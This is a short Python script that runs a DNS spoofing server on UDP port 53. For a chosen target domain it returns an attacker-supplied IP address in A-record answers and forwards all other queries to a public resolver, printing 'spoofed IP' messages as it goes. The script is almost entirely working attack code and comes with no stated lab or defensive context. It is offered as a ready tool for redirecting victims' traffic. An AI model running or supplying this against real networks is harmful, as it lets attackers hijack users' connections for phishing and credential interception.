import socket
import dns.message
import dns.resolver
import argparse
from colorama import Fore, Back, Style


host = '0.0.0.0'
port = 53
global target_list
google_dns = '8.8.8.8'

def proc(target,ip,data):

    # raw data to readable format
    query = dns.message.from_wire(data)

    #extracting requested domain
    domain = query.question[0].name.to_text()


    #print(domain)
    #rdtype
    rdtype = query.question[0].rdtype

    try:

        if domain == target:
            print(Back.GREEN+f'[+] Recieved request for {domain}',end="")
            print(Style.RESET_ALL)
            response = dns.message.make_response(query)
            if rdtype == 1:
                answer_rrset = dns.rrset.from_text(domain, 3600, dns.rdataclass.IN, dns.rdatatype.A, ip)
                response.answer.append(answer_rrset)
                print(f'[+] Returning A type spoofed IP: {ip}')
            return response.to_wire()

        else:
            print(f'[--] {domain}')
            resolver = dns.resolver.Resolver()
            resolver.nameserver = google_dns
            response = resolver.resolve(domain,query.question[0].rdclass,query.question[0].rdtype)
            return response.response.to_wire()

    except:
        print(Fore.RED+f'[-] error for domain {domain}',end="")
        print(Style.RESET_ALL)


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('target',help='Target domain to spoof eg: www.example.com.')
    parser.add_argument('ip',help='IP to spoof for given target')

    args = parser.parse_args()

    target = args.target
    ip = args.ip



    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.bind((host,port))
        print('[+] Server has started listening')
        while True:
            data,addr = s.recvfrom(1024)
            response= proc(target,ip,data)
            #print(response)
            if response:
                s.sendto(response,addr)
